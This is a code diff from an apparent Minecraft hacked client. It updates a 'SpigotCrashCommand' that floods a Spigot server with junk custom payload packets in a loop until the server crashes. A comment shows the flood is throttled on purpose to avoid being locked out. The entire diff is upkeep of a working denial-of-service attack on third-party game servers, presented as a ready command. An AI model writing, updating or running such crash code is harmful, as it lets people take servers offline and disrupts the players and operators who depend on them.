@@ -8,15 +8,16 @@ import net.minecraft.client.MinecraftClient;
 import net.minecraft.client.network.ClientPlayNetworkHandler;
 import net.minecraft.client.network.ClientPlayerEntity;
 import net.minecraft.command.CommandSource;
-import net.minecraft.item.ItemStack;
-import net.minecraft.item.Items;
-import net.minecraft.network.packet.c2s.play.CustomPayloadC2SPacket;
+import net.minecraft.network.PacketByteBuf;
+import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
 import net.minecraft.util.Identifier;
 import net.paradise_client.Helper;
 import net.paradise_client.command.Command;
 
 import java.nio.charset.StandardCharsets;
 import java.util.Random;
+
+import io.netty.buffer.Unpooled;
 
 public class SpigotCrashCommand extends Command {
 
@@ -72,19 +73,21 @@ public class SpigotCrashCommand extends Command {
 
                 while (isActive && connection.getConnection().isOpen()) {
                     for (int i = 0; i < packetCount; i++) {
-                        // Send nonsense data in a fake custom payload
                         String randomData = "crash" + random.nextInt();
                         byte[] payload = randomData.getBytes(StandardCharsets.UTF_8);
 
+                        PacketByteBuf buf = new PacketByteBuf(Unpooled.buffer());
+                        buf.writeBytes(payload);
+
                         CustomPayloadC2SPacket packet = new CustomPayloadC2SPacket(
-                                new Identifier("MC|BSign"), // or any arbitrary channel
-                                new net.minecraft.network.PacketByteBuf(io.netty.buffer.Unpooled.wrappedBuffer(payload))
+                            new Identifier("minecraft", "book_sign"), // Or any valid custom channel
+                            buf
                         );
 
                         connection.sendPacket(packet);
                     }
 
-                    Thread.sleep(50);
+                    Thread.sleep(50); // throttle to avoid lockout
                 }
             } catch (Exception e) {
                 Helper.printChatMessage("§cCrash error: " + e.getMessage());
